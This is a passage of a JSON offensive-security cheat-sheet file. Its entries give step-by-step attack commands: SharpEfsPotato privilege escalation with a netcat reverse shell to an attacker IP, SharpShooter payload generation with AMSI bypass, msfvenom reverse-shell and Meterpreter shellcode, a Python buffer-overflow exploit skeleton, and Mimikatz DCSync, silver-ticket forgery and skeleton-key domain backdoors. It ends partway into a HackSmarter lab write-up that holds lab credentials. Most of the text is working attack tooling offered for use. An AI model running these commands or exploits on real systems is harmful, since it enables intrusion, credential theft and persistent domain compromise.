        "remote": true,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks - Linux PrivEsc",
        "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Linux executables load shared libraries (.so files) at runtime. Hijacking library loading can lead to code execution.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Token Impersonation - Potato Attacks",
    "title": "SharpEfsPotato",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Download",
        "codes": [
          {
            "lang": "powershell",
            "code": "iwr -uri http://<KaliIP>/SharpEfsPotato.exe -Outfile SharpEfsPotato.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Execute Command",
        "codes": [
          {
            "lang": "bash",
            "code": "SharpEfsPotato.exe -p C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -a \"whoami | Set-Content C:\\Temp\\output.txt\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Reverse Shell",
        "codes": [
          {
            "lang": "bash",
            "code": "SharpEfsPotato.exe -p C:\\Windows\\Temp\\nc.exe -a \"<AttackerIP> <Port> -e cmd.exe\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Execute Binary",
        "codes": [
          {
            "lang": "bash",
            "code": "SharpEfsPotato.exe -p C:\\Temp\\shell.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "SharpEfsPotato GitHub",
        "url": "https://github.com/bugch3ck/SharpEfsPotato"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Uses EFSRPC (Encrypting File System Remote Protocol) for impersonation. Works on Server 2016-2022, Win10-11.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "JScript and CSharp",
    "title": "SharpShooter",
    "tags": [
      "Defense_Evasion",
      "Execution",
      "Python",
      "Windows"
    ],
    "steps": [
      {
        "title": "Generate Staged JScript Payload",
        "codes": [
          {
            "lang": "bash",
            "code": "python SharpShooter.py --stageless --dotnetver 4 --payload js --output payload --rawscfile shellcode.bin --smuggle --template mcafee"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Generate HTA Payload",
        "codes": [
          {
            "lang": "bash",
            "code": "python SharpShooter.py --stageless --dotnetver 4 --payload hta --output payload --rawscfile shellcode.bin"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Generate with AMSI Bypass",
        "codes": [
          {
            "lang": "bash",
            "code": "python SharpShooter.py --stageless --dotnetver 4 --payload js --output payload --rawscfile shellcode.bin --amsi amsienable"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Framework for payload generation with built-in evasion.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Reverse Shells",
    "title": "Shell Upgrade",
    "tags": [
      "Execution",
      "Exploitation",
      "Post_Exploitation"
    ],
    "steps": [
      {
        "title": "Upgrading to Interactive Shell",
        "substeps": [
          {
            "title": "Python PTY",
            "codes": [
              {
                "lang": "bash",
                "code": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\npython -c 'import pty;pty.spawn(\"/bin/bash\")'"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Full TTY Upgrade",
            "codes": [
              {
                "lang": "bash",
                "code": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Script Command",
            "codes": [
              {
                "lang": "bash",
                "code": "script -qc /bin/bash /dev/null\nexport TERM=xterm"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Upgrade basic shell to full TTY for tab completion, history, and job control.",
            "variant": "important"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Shell Upgrade Decision Tree",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "text",
        "content": "```plaintext\nGot reverse shell?\n\u251c\u2500 Python available?\n\u2502  \u251c\u2500 Yes \u2192 Use Python PTY method\n\u2502  \u2514\u2500 No \u2192 Try script command\n\u251c\u2500 Script available?\n\u2502  \u251c\u2500 Yes \u2192 Use script method\n\u2502  \u2514\u2500 No \u2192 Try other languages\n\u2514\u2500 Nothing works?\n\u2514\u2500 Work with basic shell (it's okay!)\n```"
      }
    ]
  },
  {
    "category": "Shellcode Integration",
    "title": "Shellcode Generation and Integration",
    "tags": [
      "Binary_Exploitation",
      "Custom_Tools",
      "Debugging",
      "Exploitation",
      "Stack_Overflow",
      "WinDbg",
      "Windows"
    ],
    "steps": [
      {
        "title": "List Available Payloads",
        "codes": [
          {
            "lang": "bash",
            "code": "msfvenom -l payloads | grep windows"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "View all available msfvenom payloads."
          }
        ]
      },
      {
        "title": "Generate Reverse Shell Shellcode",
        "codes": [
          {
            "lang": "bash",
            "code": "msfvenom -p windows/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f python -b \"<BadChars>\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Create Windows reverse shell payload."
          }
        ]
      },
      {
        "title": "Generate Meterpreter Shellcode",
        "codes": [
          {
            "lang": "bash",
            "code": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f python -b \"<BadChars>\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Create staged Meterpreter payload."
          }
        ]
      },
      {
        "title": "Common Output Formats",
        "codes": [
          {
            "lang": "bash",
            "code": "-f python       # Python byte string\n-f c            # C-style array\n-f raw          # Raw binary\n-f hex          # Hex string\n-f py           # Python (alternative)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Specify shellcode format for your exploit."
          }
        ]
      },
      {
        "title": "Specify Encoder",
        "codes": [
          {
            "lang": "bash",
            "code": "msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -e x86/shikata_ga_nai -f python -b \"<BadChars>\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use specific encoder for evasion or bad character avoidance."
          }
        ]
      },
      {
        "title": "Multiple Encoding Iterations",
        "codes": [
          {
            "lang": "bash",
            "code": "msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -e x86/shikata_ga_nai -i 3 -f python -b \"<BadChars>\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Apply encoder multiple times."
          }
        ]
      },
      {
        "title": "Common Bad Characters String",
        "codes": [
          {
            "lang": "bash",
            "code": "-b \"\\x00\\x0a\\x0d\"            # NULL, LF, CR\n-b \"\\x00\\x0a\\x0d\\x20\"        # Add space"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Format for msfvenom bad character exclusion."
          }
        ]
      },
      {
        "title": "Set Exit Function",
        "codes": [
          {
            "lang": "bash",
            "code": "msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<Port> EXITFUNC=thread -f python -b \"<BadChars>\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Specify how shellcode should exit."
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "**EXITFUNC Options**: thread, process, seh, none",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Complete Exploit Structure",
        "codes": [
          {
            "lang": "python",
            "code": "import socket\nimport struct\n\n# Configuration\ntarget_ip = \"<TargetIP>\"\ntarget_port = <TargetPort>\noffset = <Offset>\neip = struct.pack(\"<I\", <JmpEspAddress>)\n\n# msfvenom -p windows/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f python -b \"\\x00\"\nshellcode = b\"\"\nshellcode += b\"\\xfc\\xe8\\x82\\x00\\x00\\x00...\"  # Generated shellcode\n\n# Build payload\nbuffer = b\"A\" * offset\nbuffer += eip\nbuffer += b\"\\x90\" * 16      # NOP sled\nbuffer += shellcode\n\n# Send exploit\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((target_ip, target_port))\ns.send(buffer)\ns.close()"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Putting all pieces together."
          }
        ]
      },
      {
        "title": "Start Listener",
        "codes": [
          {
            "lang": "bash",
            "code": "nc -nvlp <Port>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Set up listener to catch reverse shell."
          }
        ]
      },
      {
        "title": "Metasploit Listener",
        "codes": [
          {
            "lang": "bash",
            "code": "msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <AttackerIP>; set LPORT <Port>; run\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use multi/handler for Meterpreter payloads."
          }
        ]
      },
      {
        "title": "NOP Sled Purpose [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "NOPs provide landing zone for imprecise jumps:\n- **0x90**: NOP instruction (No Operation)\n- Allows shellcode to execute even if ESP is slightly off\n- Typically 8-32 bytes before shellcode",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Debugging Shellcode Execution",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> bp <JmpEspAddress>   ; Break on JMP ESP\n0:000> g                    ; Run until breakpoint\n0:000> t                    ; Step into shellcode\n0:000> db eip L50           ; Verify shellcode bytes"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Verify shellcode reaches execution."
          }
        ]
      },
      {
        "title": "Shellcode Not Executing Checklist",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Common issues when shellcode fails:\n1. Bad characters corrupting shellcode\n2. DEP preventing stack execution\n3. Insufficient space for shellcode\n4. Wrong architecture (x86 vs x64)\n5. Encoder decoder failing (bad chars in decoder)",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "msfvenom Documentation",
        "url": "https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Generate shellcode and integrate it into stack overflow exploits."
      }
    ]
  },
  {
    "category": "Silver Ticket",
    "title": "Silver Ticket",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Common Service SPNs",
        "codes": [
          {
            "lang": "bash",
            "code": "cifs/<hostname>     - File shares (SMB)\nhttp/<hostname>     - Web services, WinRM\nhost/<hostname>     - Scheduled tasks, WMI\nldap/<hostname>     - LDAP operations\nmssql/<hostname>    - SQL Server"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Prerequisites",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Get domain SID\n(Get-ADDomain).DomainSID.Value"
          },
          {
            "lang": "powershell",
            "code": "# Get computer account hash (for CIFS, HOST, etc.)\n.\\mimikatz.exe \"lsadump::dcsync /domain:<Domain> /user:<ComputerName>$\" \"exit\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Need service account hash and domain SID.",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Create Silver Ticket with Mimikatz",
        "codes": [
          {
            "lang": "powershell",
            "code": "# CIFS (file shares)\n.\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /target:<TargetFQDN> /service:cifs /rc4:<ServiceHash> /ptt\" \"exit\""
          },
          {
            "lang": "powershell",
            "code": "# HTTP (WinRM/PSRemoting)\n.\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /target:<TargetFQDN> /service:http /rc4:<ServiceHash> /ptt\" \"exit\""
          },
          {
            "lang": "powershell",
            "code": "# HOST (scheduled tasks, WMI)\n.\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /target:<TargetFQDN> /service:host /rc4:<ServiceHash> /ptt\" \"exit\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Create Silver Ticket from Kali",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-ticketer -nthash <ServiceHash> -domain-sid <DomainSID> -domain <Domain> -spn cifs/<TargetFQDN> Administrator"
          },
          {
            "lang": "bash",
            "code": "# Use the ticket\nexport KRB5CCNAME=Administrator.ccache\nimpacket-smbclient -k -no-pass <Domain>/Administrator@<TargetFQDN>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Verify and Use",
        "codes": [
          {
            "lang": "powershell",
            "code": "klist\ndir \\\\<TargetFQDN>\\C$"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks Silver Ticket",
        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Forge a TGS for a specific service. Requires the service account's NTLM hash. More stealthy than Golden Ticket (no DC contact needed).",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Silver Ticket",
    "title": "Silver Ticket",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Impacket",
      "Kerberos",
      "Mimikatz",
      "Persistence",
      "Silver_Ticket",
      "Windows"
    ],
    "steps": [
      {
        "title": "Common Service SPNs",
        "codes": [
          {
            "lang": "bash",
            "code": "cifs/<hostname>     - File shares (SMB)\nhttp/<hostname>     - Web services, WinRM\nhost/<hostname>     - Scheduled tasks, WMI\nldap/<hostname>     - LDAP operations\nmssql/<hostname>    - SQL Server"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Prerequisites",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Get domain SID\n(Get-ADDomain).DomainSID.Value"
          },
          {
            "lang": "powershell",
            "code": "# Get computer account hash (for CIFS, HOST, etc.)\n.\\mimikatz.exe \"lsadump::dcsync /domain:<Domain> /user:<ComputerName>$\" \"exit\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Need service account hash and domain SID.",
            "variant": "important"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "HackTricks Silver Ticket",
        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Forge a TGS for a specific service. Requires the service account's NTLM hash. More stealthy than Golden Ticket (no DC contact needed).",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "Silver Ticket (Service Access)",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "Get Domain SID",
        "codes": [
          {
            "lang": "powershell",
            "code": "whoami /user"
          },
          {
            "lang": "bash",
            "code": "lookupsid.py <Domain>/<User>:<Pass>@<DC_IP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Dump Service Hashes with Mimikatz",
        "codes": [
          {
            "lang": "powershell",
            "code": "privilege::debug\nsekurlsa::logonpasswords"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Create Silver Ticket - Mimikatz",
        "codes": [
          {
            "lang": "bash",
            "code": "kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /target:<TargetServer> /service:<ServiceName> /rc4:<ServiceHash> /ptt\nkerberos::golden /sid:<DomainSID> /domain:<Domain> /ptt /target:<TargetHost> /service:http /rc4:<ServiceNTHash> /user:<FakeUser>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Example for IIS HTTP service."
          }
        ]
      },
      {
        "title": "Create Silver Ticket - Impacket",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-ticketer -nthash <SvcHash> -domain-sid <DomainSID> -domain <Domain> -spn cifs/<Target> Administrator\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec <Domain>/Administrator@<Target> -k -no-pass"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "List Tickets",
        "codes": [
          {
            "lang": "powershell",
            "code": "klist"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Use Service with Ticket",
        "codes": [
          {
            "lang": "powershell",
            "code": "iwr -UseDefaultCredentials http://<TargetHost>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Forge TGS for specific service using service account NTLM hash."
      }
    ]
  },
  {
    "category": "Mimikatz",
    "title": "Silver Ticket Attack",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [
      {
        "title": "Silver Ticket for CIFS (File Shares)",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /target:<TargetFQDN> /service:cifs /rc4:<ComputerHash> /ptt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Silver Ticket for HTTP (WinRM)",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /target:<TargetFQDN> /service:http /rc4:<ComputerHash> /ptt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Silver Ticket for HOST (Scheduled Tasks, WMI)",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /target:<TargetFQDN> /service:host /rc4:<ComputerHash> /ptt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Silver Ticket for LDAP",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /target:<TargetFQDN> /service:ldap /rc4:<ComputerHash> /ptt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Silver tickets target specific services instead of entire domain.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Linux Enumeration",
    "title": "Situational Awareness and Process Manipulation",
    "tags": [
      "Discovery",
      "Enumeration",
      "Linux"
    ],
    "steps": [
      {
        "title": "Current User Information",
        "codes": [
          {
            "lang": "bash",
            "code": "id"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "List Logged On Users",
        "codes": [
          {
            "lang": "bash",
            "code": "# List logged on users and what they are doing\nw"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Show Currently Logged In Users",
        "codes": [
          {
            "lang": "bash",
            "code": "who -a"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Show Login History",
        "codes": [
          {
            "lang": "bash",
            "code": "last -a"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Process Listing",
        "codes": [
          {
            "lang": "bash",
            "code": "ps -ef"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "List Mounted Drives",
        "codes": [
          {
            "lang": "bash",
            "code": "mount"
          },
          {
            "lang": "bash",
            "code": "findmnt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Kill Process by PID",
        "codes": [
          {
            "lang": "bash",
            "code": "kill -9 <PID>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Kill All Processes by Name",
        "codes": [
          {
            "lang": "bash",
            "code": "killall <ProcessName>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Show Active Processes",
        "codes": [
          {
            "lang": "bash",
            "code": "top"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "List Configured Mounts",
        "codes": [
          {
            "lang": "bash",
            "code": "cat /etc/fstab"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Mimikatz",
    "title": "Skeleton Key Attack",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [
      {
        "title": "Inject Skeleton Key",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # privilege::debug\nmimikatz # misc::skeleton"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Use Skeleton Key",
        "codes": [
          {
            "lang": "bash",
            "code": "# Map network share\nnet use \\\\DC01\\C$ /user:Administrator mimikatz\n\n# RDP to any machine\nrdesktop <TargetIP> -u Administrator -p mimikatz -d <Domain>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Skeleton key is cleared on DC reboot.",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Injects backdoor into Domain Controller LSASS - all users can authenticate with \"mimikatz\" password.",
        "variant": "warning"
      }
    ]
  },
  {
    "category": "Slayer -  Lab Machine",
    "title": "Slayer - Lab Machine",
    "tags": [
      "HackSmarter",
      "Output"
    ],
    "steps": [
      {
        "title": "Machine Info",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "- **Platform**: HackSmarter\n- **Difficulty**: Easy\n- **OS**: Windows\n- **IP Address**: 10.1.146.220\n- **Date Started**: 01-27-2026\n- **Date Completed**: 01-27-2026\n- **User Flag**: N/A\n- **Root Flag**: `3835538****************9ef125496`"
          }
        ]
      },
      {
        "title": "Scenario Description",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Following a successful social engineering engagement, you have obtained user-level credentials for a corporate workstation. Your objective is to leverage this initial access to perform deep reconnaissance on the internal Windows host. The final goal is to escalate privileges and capture the root flag from the administrator's directory to demonstrate full system compromise.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Provided Credentials",
        "substeps": [
          {
            "title": "Username",
            "codes": [
              {
                "lang": "bash",
                "code": "tyler.ramsey"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Password",
            "codes": [
              {
                "lang": "bash",
                "code": "P@ssw0rd!"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Create Directory Structure",
        "codes": [
          {
            "lang": "bash",
            "code": "mkdir -p /root/machines/Slayer/10.1.146.220/{logs,web,scan,nxc,exploit,bloodhound,loot,privesc,www} && cd /root/machines/Slayer/10.1.146.220 && touch usernames passwords confirmedCreds notes && ls -latr"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Launch Logged Terminal Tabs",
        "codes": [
          {
            "lang": "bash",
            "code": "TS=$(date +%Y%m%d_%H%M) && xfce4-terminal --maximize --hide-menubar --hide-toolbar --working-directory=/root/machines/Slayer/10.1.146.220/ --title=\"Shell\" -e \"script -q -f /root/machines/Slayer/10.1.146.220/logs/shell_$TS.log\" --tab --working-directory=/root/machines/Slayer/10.1.146.220/scan --title=\"Scan\" -e \"script -q -f /root/machines/Slayer/10.1.146.220/logs/scan_$TS.log -c 'rustscan -a 10.1.146.220 --ulimit 5000 -b 1500 -- -sC -sV -Pn -oN /root/machines/Slayer/10.1.146.220/scan/tcp.txt; exec bash'\" --tab --working-directory=/root/machines/Slayer/10.1.146.220/nxc --title=\"NXC\" -e \"script -q -f /root/machines/Slayer/10.1.146.220/logs/nxc_$TS.log\" --tab --working-directory=/root/machines/Slayer/10.1.146.220/web --title=\"Web\" -e \"script -q -f /root/machines/Slayer/10.1.146.220/logs/web_$TS.log\" --tab --working-directory=/root/machines/Slayer/10.1.146.220/exploit --title=\"Exploit\" -e \"script -q -f /root/machines/Slayer/10.1.146.220/logs/exploit_$TS.log\" --tab --working-directory=/root/machines/Slayer/10.1.146.220/ --title=\"Notes\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Maximize Terminal Window",
        "codes": [
          {
            "lang": "bash",
            "code": "wmctrl -r :ACTIVE: -b add,maximized_vert,maximized_horz"
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumeration",
        "substeps": [
          {
            "title": "RustScan TCP",
            "codes": [
              {
                "lang": "bash",
                "code": "rustscan -a 10.1.146.220 --ulimit 5000 -b 1500 -- -sC -sV -Pn -oN scan.txt"
              },
              {
                "lang": "text",
                "code": "# Output\nOpen 10.1.146.220:135\nOpen 10.1.146.220:445\nOpen 10.1.146.220:3389\nOpen 10.1.146.220:49669\n\n\nNmap scan report for EC2AMAZ-M1LFCNO.EC2AMAZ-M1LFCNO (10.1.146.220)\n\nPORT     STATE SERVICE       REASON          VERSION\n135/tcp  open  msrpc         syn-ack ttl 126 Microsoft Windows RPC\n445/tcp  open  microsoft-ds? syn-ack ttl 126\n3389/tcp open  ms-wbt-server syn-ack ttl 126"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Nmap UDP",
            "codes": [
              {
                "lang": "bash",
                "code": "nmap -sU --top-ports 20 -sV 10.1.146.220 -oN udp_scan.txt"
              },
              {
                "lang": "text",
                "code": "# Output\nPORT      STATE         SERVICE      VERSION\n53/udp    open|filtered domain\n67/udp    open|filtered dhcps\n68/udp    open|filtered dhcpc\n69/udp    open|filtered tftp\n123/udp   open|filtered ntp\n135/udp   open|filtered msrpc\n137/udp   open|filtered netbios-ns\n138/udp   open|filtered netbios-dgm\n139/udp   open|filtered netbios-ssn\n161/udp   open|filtered snmp\n162/udp   open|filtered snmptrap\n445/udp   open|filtered microsoft-ds\n500/udp   open|filtered isakmp\n514/udp   open|filtered syslog\n520/udp   open|filtered route\n631/udp   open|filtered ipp\n1434/udp  open|filtered ms-sql-m\n1900/udp  open|filtered upnp\n4500/udp  open|filtered nat-t-ike\n49152/udp open|filtered unknown"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "authfinder",
            "codes": [
              {
                "lang": "bash",
                "code": "cd /opt/authfinder && python3 authfinder.py 10.1.146.220 'tyler.ramsey' 'P@ssw0rd!'"
              },
              {
                "lang": "text",
                "code": "# Output\n[Target] 10.1.146.220 | User: tyler.ramsey\n    Service      Auth     Exec       Notes\n    \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    winrm        FAILED   -          timed out\n    smbexec      OK       FAILED     command failed (check permissions)\n    wmi          OK       FAILED     WMI exec failed\n    ssh          FAILED   -          timed out\n    mssql        FAILED   -          timed out\n    psexec       OK       FAILED     no writable shares\n    atexec       OK       FAILED     task creation denied\n    rdp          OK       FAILED     exec failed. Try manual RDP."
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false,
            "postNotes": [
              {
                "type": "note",
                "content": "Can try manual RDP...",
                "variant": "tip"
              },
              {
                "type": "text",
                "content": "---"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "RDP",
        "codes": [
          {
            "lang": "bash",
